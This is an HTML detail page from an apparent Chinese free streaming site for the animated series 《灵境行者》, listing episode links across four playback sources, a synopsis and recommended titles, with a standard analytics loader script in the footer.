@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!--    <meta name="referrer" content="no-referrer">-->
+    <link rel="icon" type="image/webp" href="/img/favicon.webp">
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <!-- logo 由 common.css 通过 background:url() 引用，浏览器要先解析完 CSS 才发现，
+         preload 让它与 CSS 并行下载，首屏 header 出现更早。fetchpriority=high 提示优先级。 -->
+    <link rel="preload" as="image" href="/img/logo.png" fetchpriority="high">
+    <link rel="stylesheet" href="/css/bs-lite.css?v=2026092401">
+    <link rel="stylesheet" href="/css/base.css?v=2026092401">
+    <link rel="stylesheet" href="/css/common.css?v=2026100902">
+    <link rel="stylesheet" href="/css/motion.css?v=2026101501">
+    
+    <script defer src="/js/play-history.js?v=2026100901"></script>
+    
+    <title>《灵境行者》动漫高清完整版免费在线观看 - 极速追剧</title>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="/css/detail.css?v=2026092404">
+    
+    
+    <meta name="description" content="《灵境行者》是2023年起点头部同名小说改编动画，作者卖报小郎君。故事世界观设定鲜明，风格多变，灵境副本奇谲诡变。主角张元清，因一张神秘的黑卡成为夜游神，却身陷两大阵营正邪对抗的阴谋漩涡。">
+    <meta name="keywords" content="灵境行者,,,中国大陆">
+    <link rel="canonical" href="https://jisuzhuiju.com/detail/702.html">
+    <meta property="og:type" content="video.tv_show">
+    <meta property="og:title" content="《灵境行者》动漫高清完整版免费在线观看">
+    <meta property="og:description" content="《灵境行者》是2023年起点头部同名小说改编动画，作者卖报小郎君。故事世界观设定鲜明，风格多变，灵境副本奇谲诡变。主角张元清，因一张神秘的黑卡成为夜游神，却身陷两大阵营正邪对抗的阴谋漩涡。">
+    <meta property="og:image" content="https://vcover-vt-pic.puui.qpic.cn/vcover_vt_pic/0/mzc0020082u0tna1787815487790/0">
+    <meta property="og:url" content="https://jisuzhuiju.com/detail/702.html">
+    <meta property="og:site_name" content="极速追剧">
+    <meta property="og:locale" content="zh_CN">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="《灵境行者》动漫高清完整版免费在线观看">
+    <meta name="twitter:description" content="《灵境行者》是2023年起点头部同名小说改编动画，作者卖报小郎君。故事世界观设定鲜明，风格多变，灵境副本奇谲诡变。主角张元清，因一张神秘的黑卡成为夜游神，却身陷两大阵营正邪对抗的阴谋漩涡。">
+    <meta name="twitter:image" content="https://vcover-vt-pic.puui.qpic.cn/vcover_vt_pic/0/mzc0020082u0tna1787815487790/0">
+</head>
+<!-- 播放页顶栏随页面滚动，不需要给固定导航栏留位，body 的 padding-top 由 play.css 归零 -->
+<body>
+<header>
+    <header>
+        <div class="header">
+        <div class="container1">
+
+            <div class="logo">
+                <div>
+                    <a href="/" title="极速追剧">极速追剧</a>
+                </div>
+            </div>
+            <nav class="nav">
+                <ul>
+                    <li><a href="/">首页</a></li>
+                    <li><a href="/type/dianshiju.html">电视剧</a></li>
+                    <li><a href="/type/dianying.html">电影</a></li>
+                    <li><a href="/type/dongman.html">动漫</a></li>
+                    <li><a href="/type/zongyi.html">综艺</a></li>
+                    <li><a href="/message">留言</a></li>
+                    <li><a href="/app" style="color: #c62828">APP下载</a></li>
+                </ul>
+            </nav>
+        </div>
+        <div class="container2">
+            <div class="header-actions">
+                <a href="/search" class="action-btn" title="搜索">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="11" cy="11" r="8"></circle>
+                        <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+                    </svg>
+                </a>
+                <!--
+                  收藏 + 最近观看两个下拉。
+                  这里的 class 与 id 是 play-history.js mountDropdown 的挂载契约
+                  （favBox / favToggle / favPanel / favList / favEmpty / favClear，historyBox 同理），
+                  改名必须连 JS 一起改；也正因为这份契约，全站只能存在一套，不能为了播放页顶栏再渲染一份。
+                -->
+                <div class="history-box" id="favBox">
+                    <a href="#" class="action-btn" id="favToggle" title="我的收藏"
+                       aria-haspopup="true" aria-expanded="false">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path>
+                        </svg>
+                    </a>
+                    <div class="history-panel" id="favPanel">
+                        <div class="history-panel-header">
+                            <span class="history-panel-title">我的收藏</span>
+                            <button type="button" class="history-clear" id="favClear">清空</button>
+                        </div>
+                        <div class="history-list" id="favList"></div>
+                        <div class="history-empty" id="favEmpty">还没有收藏影片</div>
+                    </div>
+                </div>
+                <div class="history-box" id="historyBox">
+                    <a href="#" class="action-btn" id="historyToggle" title="最近观看"
+                       aria-haspopup="true" aria-expanded="false">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <polyline points="12 6 12 12 16 14"></polyline>
+                        </svg>
+                    </a>
+                    <div class="history-panel" id="historyPanel">
+                        <div class="history-panel-header">
+                            <span class="history-panel-title">最近观看</span>
+                            <button type="button" class="history-clear" id="historyClear">清空</button>
+                        </div>
+                        <div class="history-list" id="historyList"></div>
+                        <div class="history-empty" id="historyEmpty">还没有观看记录</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        </div>
+    </header>
+</header>
+
+<main class="main detail-page-main">
+    <div class="container detail-container page-container">
+
+        
+
+        <div>
+
+            <!-- JSON-LD 结构化数据：由 DetailController 统一拼接并转义后整体输出，避免影片名含引号破坏 JSON -->
+            <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"首页","item":"https://jisuzhuiju.com/"},{"@type":"ListItem","position":2,"name":"动漫","item":"https://jisuzhuiju.com/type/3.html"},{"@type":"ListItem","position":3,"name":"灵境行者"}]},{"@type":"TVSeries","name":"灵境行者","description":"《灵境行者》是2023年起点头部同名小说改编动画，作者卖报小郎君。故事世界观设定鲜明，风格多变，灵境副本奇谲诡变。主角张元清，因一张神秘的黑卡成为夜游神，却身陷两大阵营正邪对抗的阴谋漩涡。","image":"https://vcover-vt-pic.puui.qpic.cn/vcover_vt_pic/0/mzc0020082u0tna1787815487790/0","thumbnailUrl":"https://vcover-vt-pic.puui.qpic.cn/vcover_vt_pic/0/mzc0020082u0tna1787815487790/0","datePublished":"2026","genre":"奇幻,冒险,中国动漫","actor":"","director":"","inLanguage":"普通话","countryOfOrigin":{"@type":"Country","name":"中国大陆"},"aggregateRating":{"@type":"AggregateRating","ratingValue":"7.8","bestRating":"10","worstRating":"0"},"potentialAction":{"@type":"WatchAction","target":"https://jisuzhuiju.com/detail/702.html"},"numberOfEpisodes":24,"episode":[{"@type":"TVEpisode","episodeNumber":1,"name":"第1集","url":"https://jisuzhuiju.com/vodplay/702-qq-1.html"}]}]}</script>
+
+            <div class="detail-header-card">
+                <div class="detail-poster-wrapper">
+                    <img src="https://vcover-vt-pic.puui.qpic.cn/vcover_vt_pic/0/mzc0020082u0tna1787815487790/0"
+                         alt="灵境行者海报 - 主演：vodInfo.vodActor"
+                         width="200" height="300"
+                         fetchpriority="high" decoding="async" loading="eager"
+                         referrerpolicy="no-referrer">
+                </div>
+
+                <div class="detail-info-content">
+                    <h1 class="detail-title">灵境行者</h1>
+
+                    <div class="detail-tags">
+                        <span class="tag-pill">奇幻</span><span class="tag-pill">冒险</span><span class="tag-pill">中国动漫</span>
+                    </div>
+
+                    <div class="detail-meta-grid">
+                        <div class="meta-item">
+                            <span class="meta-label">别名：</span>
+                            <span class="meta-value"></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">主演：</span>
+                            <span class="meta-value"></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">导演：</span>
+                            <span class="meta-value"></span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">地区：</span>
+                            <span class="meta-value">中国大陆</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">语言：</span>
+                            <span class="meta-value">普通话</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">年份：</span>
+                            <span class="meta-value">2026</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">更新：</span>
+                            <span class="meta-value">2026-11-12 04:58</span>
+                        </div>
+                        <div class="meta-item">
+                            <span class="meta-label">备注：</span>
+                            <span class="meta-value">第12集</span>
+                        </div>
+                    </div>
+
+                    <div class="detail-action-buttons">
+                        <a class="btn-play-large" id="playBtn"
+                           href="/vodplay/702-qq-1.html" data-vod-id="702">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
+                                <polygon points="5 3 19 12 5 21 5 3"/>
+                            </svg>
+                            <span id="playBtnText">立即播放</span>
+                            <span class="resume-hint" id="resumeHint" style="display:none"></span>
+                        </a>
+                        <button class="btn-icon-action" id="favBtn" title="收藏" data-vod-id="702" data-name="灵境行者" data-pic="https://vcover-vt-pic.puui.qpic.cn/vcover_vt_pic/0/mzc0020082u0tna1787815487790/0" data-remarks="第12集" data-year="2026">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
+                            </svg>
+                            <span>收藏</span>
+                        </button>
+                        <button class="btn-icon-action" id="likeBtn" title="点赞"
+                                onclick="handleLike(this)" data-vod-id="702">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M14 9V5a3 3 0 0 0-3-3l-4 9v11h11.28a2 2 0 0 0 2-1.7l1.38-9a2 2 0 0 0-2-2.3H14z"/>
+                                <path d="M7 22H4a2 2 0 0 1-2-2v-7a2 2 0 0 1 2-2h3"/>
+                            </svg>
+                            <span>点赞</span>
+                        </button>
+                        <button class="btn-icon-action" title="分享">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/>
+                                <polyline points="16 6 12 2 8 6"/>
+                                <line x1="12" y1="2" x2="12" y2="15"/>
+                            </svg>
+                            <span>分享</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="detail-qr-code">
+                    <img id="pageQrCode" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="扫码在手机端观看">
+                    <p class="qr-label">
+                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+                            <line x1="12" y1="18" x2="12.01" y2="18"/>
+                        </svg>
+                        手机扫码观看
+                    </p>
+                </div>
+            </div>
+
+            <div class="detail-stats-bar">
+                <div class="stat-box">
+                    <div class="stat-number">
+                        <span>7.8</span>
+                        
+                    </div>
+                    <span class="stat-text">豆瓣评分</span>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number">
+                        
+                        <span>802</span>
+                        
+                    </div>
+                    <span class="stat-text">播放热度</span>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number">
+                        
+                        <span>未知</span>
+                    </div>
+                    <span class="stat-text">点赞数</span>
+                </div>
+                <div class="stat-box">
+                    <div class="stat-number">
+                        <span>24</span>
+                        
+                    </div>
+                    <span class="stat-text">总集数</span>
+                </div>
+            </div>
+
+            <div class="detail-card">
+                <div class="vod-section-header">
+                    <span class="vod-section-bar"></span>
+                    <h2 class="vod-section-title">播放线路</h2>
+                </div>
+
+                <div class="source-tabs">
+                    <button class="source-tab active"
+                            onclick="switchSource(this)" data-target="source-0">腾讯官方线路</button><button class="source-tab"
+                            onclick="switchSource(this)" data-target="source-1">自建线路</button><button class="source-tab"
+                            onclick="switchSource(this)" data-target="source-2">普通线路二</button><button class="source-tab"
+                            onclick="switchSource(this)" data-target="source-3">普通线路一</button>
+                </div>
+
+                <div class="source-panel"
+                     id="source-0"
+                     data-visible="1">
+                    <div class="episode-grid">
+                        <a href="/vodplay/702-qq-1.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="0">第1集</a><a href="/vodplay/702-qq-2.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="1">第2集</a><a href="/vodplay/702-qq-3.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="2">第3集</a><a href="/vodplay/702-qq-4.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="3">第4集</a><a href="/vodplay/702-qq-5.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="4">第5集</a><a href="/vodplay/702-qq-6.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="5">第6集</a><a href="/vodplay/702-qq-7.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="6">第7集</a><a href="/vodplay/702-qq-8.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="7">第8集</a><a href="/vodplay/702-qq-9.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="8">第9集</a><a href="/vodplay/702-qq-10.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="9">第10集</a><a href="/vodplay/702-qq-11.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="10">第11集</a><a href="/vodplay/702-qq-12.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="11">第12集</a><a href="/vodplay/702-qq-13.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="12">第13集</a><a href="/vodplay/702-qq-14.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="13">第14集</a><a href="/vodplay/702-qq-15.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="14">第15集</a>
+                        <button class="episode-btn episode-expand-btn" style="display:none" onclick="toggleExpand(this)">
+                            展开全部
+                        </button>
+                    </div>
+                </div>
+
+                <div class="source-panel"
+                     id="source-1"
+                     style="display:none">
+                    <div class="episode-grid">
+                        <a href="/vodplay/702-covip-1.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="0">1</a><a href="/vodplay/702-covip-2.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="1">2</a><a href="/vodplay/702-covip-3.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="2">3</a><a href="/vodplay/702-covip-4.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="3">4</a><a href="/vodplay/702-covip-5.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="4">5</a><a href="/vodplay/702-covip-6.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="5">6</a><a href="/vodplay/702-covip-7.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="6">7</a><a href="/vodplay/702-covip-8.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="7">8</a><a href="/vodplay/702-covip-9.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="8">9</a><a href="/vodplay/702-covip-10.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="9">10</a><a href="/vodplay/702-covip-11.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="10">11</a><a href="/vodplay/702-covip-12.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="11">12</a>
+                        <button class="episode-btn episode-expand-btn" style="display:none" onclick="toggleExpand(this)">
+                            展开全部
+                        </button>
+                    </div>
+                </div>
+
+                <div class="source-panel"
+                     id="source-2"
+                     style="display:none">
+                    <div class="episode-grid">
+                        <a href="/vodplay/702-bfzym3u8-1.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="0">第1集</a><a href="/vodplay/702-bfzym3u8-2.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="1">第2集</a><a href="/vodplay/702-bfzym3u8-3.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="2">第3集</a><a href="/vodplay/702-bfzym3u8-4.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="3">第4集</a><a href="/vodplay/702-bfzym3u8-5.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="4">第5集</a><a href="/vodplay/702-bfzym3u8-6.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="5">第6集</a><a href="/vodplay/702-bfzym3u8-7.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="6">第7集</a><a href="/vodplay/702-bfzym3u8-8.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="7">第8集</a><a href="/vodplay/702-bfzym3u8-9.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="8">第9集</a><a href="/vodplay/702-bfzym3u8-10.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="9">第10集</a><a href="/vodplay/702-bfzym3u8-11.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="10">第11集</a><a href="/vodplay/702-bfzym3u8-12.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="11">第12集</a>
+                        <button class="episode-btn episode-expand-btn" style="display:none" onclick="toggleExpand(this)">
+                            展开全部
+                        </button>
+                    </div>
+                </div>
+
+                <div class="source-panel"
+                     id="source-3"
+                     style="display:none">
+                    <div class="episode-grid">
+                        <a href="/vodplay/702-jsm3u8-1.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="0">第01集</a><a href="/vodplay/702-jsm3u8-2.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="1">第02集</a><a href="/vodplay/702-jsm3u8-3.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="2">第03集</a><a href="/vodplay/702-jsm3u8-4.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="3">第04集</a><a href="/vodplay/702-jsm3u8-5.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="4">第05集</a><a href="/vodplay/702-jsm3u8-6.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="5">第06集</a><a href="/vodplay/702-jsm3u8-7.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="6">第07集</a><a href="/vodplay/702-jsm3u8-8.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="7">第08集</a><a href="/vodplay/702-jsm3u8-9.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="8">第09集</a><a href="/vodplay/702-jsm3u8-10.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="9">第10集</a><a href="/vodplay/702-jsm3u8-11.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="10">第11集</a><a href="/vodplay/702-jsm3u8-12.html"
+                           class="episode-btn text-decoration-none"
+                           data-index="11">第12集</a>
+                        <button class="episode-btn episode-expand-btn" style="display:none" onclick="toggleExpand(this)">
+                            展开全部
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            
+
+            <div class="detail-card">
+                <div class="vod-section-header">
+                    <span class="vod-section-bar"></span>
+                    <h2 class="vod-section-title">剧情简介</h2>
+                    <button class="synopsis-expand-btn" id="synopsisExpandBtn" onclick="toggleSynopsis()" style="display:none">
+                        展开全部
+                    </button>
+                </div>
+                <div class="synopsis-content" id="synopsisContent">《灵境行者》是2023年起点头部同名小说改编动画，作者卖报小郎君。故事世界观设定鲜明，风格多变，灵境副本奇谲诡变。主角张元清，因一张神秘的黑卡成为夜游神，却身陷两大阵营正邪对抗的阴谋漩涡。</div>
+            </div>
+
+            <div class="vod-section">
+    <div class="vod-section-header">
+        <span class="vod-section-bar"></span>
+        <h2 class="vod-section-title">相关推荐</h2>
+        
+        
+    </div>
+    <div class="row g-2 g-md-4">
+        <div class="col-4 col-md-2">
+            <a href="/detail/150851.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://pic1.iqiyipic.com/image/20261111/b9/b3/a_101796289_m_601_579_772.png" alt="咕嘎游记之萌宝生活小百科封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">咕嘎游记之萌宝生活小百科</p>
+                        <p class="vod-subtitle mb-0">未知</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/149823.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://img.jisuimage.com/cover/8863fb33c3e685740c486ccc3a037130.jpg" alt="被女神拒绝后我闪婚了校花封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">被女神拒绝后我闪婚了校花</p>
+                        <p class="vod-subtitle mb-0">未知</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/148897.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://img.jisuimage.com/cover/b12383539ffeb962966fb0fbc77fc502.jpg" alt="真假千金2026封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">真假千金2026</p>
+                        <p class="vod-subtitle mb-0">未知</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/148878.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://pic8.iqiyipic.com/image/20261019/4b/95/a_101670755_m_601_m1_579_772.png" alt="高危禁药我却越喝越强封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">高危禁药我却越喝越强</p>
+                        <p class="vod-subtitle mb-0">未知</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/148401.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://pic9.iqiyipic.com/image/20261010/11/27/a_101638101_m_601_m2_579_772.png" alt="菌灵天下封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">菌灵天下</p>
+                        <p class="vod-subtitle mb-0">未知</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/148395.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://img.jisuimage.com/cover/5190452a9ee723e9645787dca4328e7e.jpg" alt="弹珠汽水瓶里的千岁同学Part2封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">弹珠汽水瓶里的千岁同学Part2</p>
+                        <p class="vod-subtitle mb-0">坂田将吾,石见舞菜香</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/147206.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://vcover-vt-pic.puui.qpic.cn/vcover_vt_pic/0/mzc00200kums5rm1790732842062/0" alt="大夏守墓人封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">大夏守墓人</p>
+                        <p class="vod-subtitle mb-0">未知</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/146268.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://img.jisuimage.com/cover/93ae0d44b350540f196d8bcde3ddeca3.jpg" alt="红妆送君葬封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">红妆送君葬</p>
+                        <p class="vod-subtitle mb-0">未知</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/11109.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://m.ykimg.com/050C000064CE1A0213EB660C8D3320A7" alt="我宅了百年出门已无敌封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">我宅了百年出门已无敌</p>
+                        <p class="vod-subtitle mb-0">未知</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/1389.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://img.jisuimage.com/cover/feaf23482ff4eb0c97088b7e1c948e4e.jpg" alt="邪魔墨然封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">邪魔墨然</p>
+                        <p class="vod-subtitle mb-0">未知</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/814.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://0img.hitv.com/preview/sp_images/2026/07/20/202607200917076061290.jpg" alt="三嫁公主封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">三嫁公主</p>
+                        <p class="vod-subtitle mb-0">未知</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <div class="col-4 col-md-2">
+            <a href="/detail/812.html" class="text-decoration-none">
+                <div class="vod-card">
+                    <div class="vod-cover">
+                        <img src="https://i0.hdslb.com/bfs/bangumi/image/c775ab901cd6a5e8c8fb02af53605f497af0107a.png" alt="李熊猫封面图片"
+                             class="w-100 h-100" width="200" height="300"
+                             loading="lazy"
+                             fetchpriority="auto"
+                             decoding="async" referrerpolicy="no-referrer">
+                    </div>
+                    <div class="vod-card-info">
+                        <p class="vod-title mb-0">李熊猫</p>
+                        <p class="vod-subtitle mb-0">齐璇,小连杀,魏一凡</p>
+                    </div>
+                </div>
+            </a>
+        </div>
+    </div>
+</div>
+        </div>
+    </div>
+
+    <!--
+      逻辑外置：选集折叠抽成共享组件 episode-grid.js，详情页交互独立成 detail.js。
+      两者均为纯静态文件（不依赖服务端内联变量），可被浏览器长期缓存。
+      episode-grid.js 必须先于 detail.js 加载。
+    -->
+    <script defer src="/js/components/episode-grid.js?v=2026092320"></script>
+    <script defer src="/js/pages/detail.js?v=2026092320"></script>
+
+</main>
+
+<footer>
+    <div class="site-footer">
+    <div class="footer-inner">
+        <div class="footer-main">
+
+            <!-- 品牌区 -->
+            <div class="footer-brand">
+                <a href="/" class="footer-logo" title="极速追剧">极速追剧</a>
+                <p class="footer-desc">海量高清影视免费在线观看，电视剧、电影、动漫、综艺一应俱全，更新快、播放流畅、画质清晰。</p>
+            </div>
+
+            <!-- 友情链接 -->
+            
+
+            <!-- 免责声明 -->
+            <div class="footer-col footer-col-wide">
+                <h4 class="footer-col-title">免责声明</h4>
+                <p class="footer-note">
+                    本站所有影片均收集自互联网公开资源，本站本身不存储、不制作、不上传任何视频内容，相关版权由原作者或发行方享有。若收录内容无意侵犯了您的权益，请联系我们，我们将在核实后第一时间删除。
+                </p>
+            </div>
+
+        </div>
+
+        <div class="footer-bottom">
+            <p>
+                © <span>2026</span>
+                <span>极速追剧</span> · 本站仅供学习交流，请勿用于任何商业用途
+                
+            </p>
+        </div>
+    </div>
+</div>
+</footer>
+
+<!-- 全站弹窗公告：后台「系统管理 → 弹窗设置」开启并配置内容后显示 -->
+
+
+<!-- 站点统计代码：后台「系统设置」中配置，原样注入到每个前台页面 -->
+<script>!function(p,u){var w=window,d=document,a=w.TJ1736=w.TJ1736||{};if(a.init){a.init(p);return;}(a.ids=a.ids||[]).push(p);if(a.loading)return;a.loading=true;var n=d.createElement("script");n.charset="UTF-8";n.async=true;n.src=u;n.id="TJ1736_COLLECT";n.onerror=function(){a.loading=false;};var r=d.getElementsByTagName("script")[0];if(r&&r.parentNode)r.parentNode.insertBefore(n,r);else(d.head||d.documentElement).appendChild(n);}({"id":"6ac641ad985777999d5b783766560dbf"},"https://tj.xddyy.com/tj/tongjiv5_code.min.js?v=5.2.8");</script>
+
+<!-- 手机端底飘广告：后台「系统设置 → 手机端底飘广告」配置，原样注入到每个前台页面 -->
